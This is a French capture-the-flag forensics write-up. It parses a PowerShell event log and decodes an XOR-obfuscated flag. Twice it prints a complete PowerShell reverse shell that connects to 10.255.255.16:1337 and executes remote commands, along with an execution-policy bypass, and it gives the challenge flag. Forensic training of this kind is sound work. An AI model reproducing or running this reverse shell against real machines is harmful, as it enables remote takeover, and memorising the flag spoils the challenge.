# La gazette de Windows

Catégorie : Intro - forensics

## Énoncé

> Il semblerait qu'un utilisateur exécute des scripts Powershell suspects sur sa machine. Heureusement cette machine est journalisée et nous avons pu récupérer le journal d'évènements Powershell. Retrouvez ce qui a été envoyé à l'attaquant.
>
> **SHA256(Microsoft-Windows-PowerShell%4Operational.evtx) = 770b92f7c98ffb708c3e364753ee4bb569ccc810dd5891cbaf1363c2063ddd78**

## Solve

On verifie l'intégrité du fichier de log :

```shell
sha256sum Microsoft-Windows-PowerShell4Operational.evtx | grep 770b92f7c98ffb708c3e364753ee4bb569ccc810dd5891cbaf1363c2063ddd78

770b92f7c98ffb708c3e364753ee4bb569ccc810dd5891cbaf1363c2063ddd78  Microsoft-Windows-PowerShell4Operational.evtx
```

On va utiliser l'outil [evtx](https://github.com/omerbenamram/evtx) pour parser les **.evtx** : 

```shell
./evtx_dump -o json Microsoft-Windows-PowerShell4Operational.evtx > powershell.json
```

On sait que des scripts powershell ont été exécutés, on va donc les chercher :

```shell
cat powershell.json| grep -i ".ps1"
      "ScriptBlockText": "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\\Users\\jmichel\\Downloads\\payload.ps1'"
      "Path": "C:\\Users\\jmichel\\Downloads\\payload.ps1",
      "Path": "C:\\Users\\jmichel\\Downloads\\payload.ps1",
      "Path": "C:\\Users\\jmichel\\Downloads\\payload.ps1",
```

Au record **1108**, le script `payload.ps1` est exécuté : 

```json
Record 1108
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "EventData": {
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Path": "",
      "ScriptBlockId": "dcb325dd-1c30-46bd-8363-81083ac85323",
      "ScriptBlockText": "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\\Users\\jmichel\\Downloads\\payload.ps1'"
    },
```

Au record **1109**, on remarque que du powershell issu du script `payload.ps1` est exécuté :

```json
Record 1109
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "EventData": {
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Path": "C:\\Users\\jmichel\\Downloads\\payload.ps1",
      "ScriptBlockId": "634cf5ca-b06b-4b5a-8354-c5ccd9d3c82a",
      "ScriptBlockText": "do {\r\n    Start-Sleep -Seconds 1\r\n     try{\r\n        $TCPClient = New-Object Net.Sockets.TCPClient('10.255.255.16', 1337)\r\n    } catch {}\r\n} until ($TCPClient.Connected)\r\n$NetworkStream = $TCPClient.GetStream()\r\n$StreamWriter = New-Object IO.StreamWriter($NetworkStream)\r\nfunction WriteToStream ($String) {\r\n    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}\r\n    $StreamWriter.Write($String + 'SHELL> ')\r\n    $StreamWriter.Flush()\r\n}\r\n$l = 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D\r\n$s = \"\"\r\nfor ($i = 0; $i -lt 72; $i++) {\r\n    $s += [char]([int]$l[$i] -bxor $i)\r\n}\r\nWriteToStream $s\r\nwhile(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {\r\n    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)\r\n    $Output = try {\r\n            Invoke-Expression $Command 2>&1 | Out-String\r\n        } catch {\r\n            $_ | Out-String\r\n        }\r\n    WriteToStream ($Output)\r\n}\r\n$StreamWriter.Close()"
    },
  }
}
```

On remet en forme le powershell pour plus de lisibilité :

```ps1
do {
    Start-Sleep -Seconds 1
    try {
        $TCPClient = New-Object Net.Sockets.TCPClient('10.255.255.16', 1337)
    }
    catch {
        # Silently catch exception
    }
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | $ {0}
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

$l = 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D

$s = ""
for ($i = 0; $i -lt 72; $i++) {
    $s += [char]([int]$l[$i] -bxor $i)
}

WriteToStream $s

while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    }
    catch {
        $_ | Out-String
    }
    WriteToStream $Output
}

$StreamWriter.Close()
```

Ce code PowerShell se connecte à un serveur distant à l'adresse IP `10.255.255.16` sur le port `1337` en utilisant le protocole TCP. Une fois la connexion établie, le code envoie une chaîne de caractères chiffré au serveur distant, qui est déchiffrée par le serveur. Ensuite, le code attend des commandes de l'utilisateur et les exécute sur le serveur distant.

On a ici un XOR de `$l`. Après l'exécution de la boucle for, la `$s` contiendra une chaîne de caractères résultant de l'opération XOR entre chaque élément de la liste `$l` et sa position dans la liste. Voici la valeur de `$s` :

```ps1
$l = 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D

$s = ""
for ($i = 0; $i -lt 72; $i++) {
    $s += [char]([int]$l[$i] -bxor $i)
}

Write-Output $s

FCSC{98c98d98e5a546dcf6b1ea6e47602972ea1ce9ad7262464604753c4f79b3abd3}
```

**Flag : FCSC{98c98d98e5a546dcf6b1ea6e47602972ea1ce9ad7262464604753c4f79b3abd3}**
